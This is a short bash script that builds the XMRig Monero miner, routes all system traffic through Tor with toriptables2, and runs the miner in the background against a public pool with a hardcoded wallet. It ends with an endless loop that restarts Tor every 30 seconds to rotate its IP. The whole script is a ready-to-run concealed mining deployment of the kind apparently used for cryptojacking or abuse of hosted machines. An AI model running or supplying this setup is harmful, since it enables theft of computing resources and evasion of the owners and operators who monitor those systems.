#!/bin/bash
sudo apt-get update
sudo apt-get install -y libmicrohttpd-dev libssl-dev cmake python build-essential libhwloc-dev screen git automake autoconf pkg-config libcurl4-openssl-dev libjansson-dev libgmp-dev libuv1-dev tor
git clone https://github.com/ruped24/toriptables2.git
cd toriptables2/
sudo mv toriptables2.py /usr/local/bin/
cd
git clone https://github.com/xmrig/xmrig.git
sudo systemctl start tor
sudo toriptables2.py -l

cd xmrig
mkdir build
cd build
cmake ..
make
sudo sysctl -w vm.nr_hugepages=128
torify ./xmrig --no-color --donate-level 1 --cpu-priority 5 -o pool.supportxmr.com:9000 -u 42iZdPFRQPN1qpHG6niqkG6cY3oZph9Vn9JZvKZ1Guce7UVWj587z7TJ15fW85FDQHNU9Wiqe3qGXfP2VNHq4xa9MK5LUrU -p x -k --tls -a cn/r -t 4 --background
while true; do service tor restart; sleep 30; done
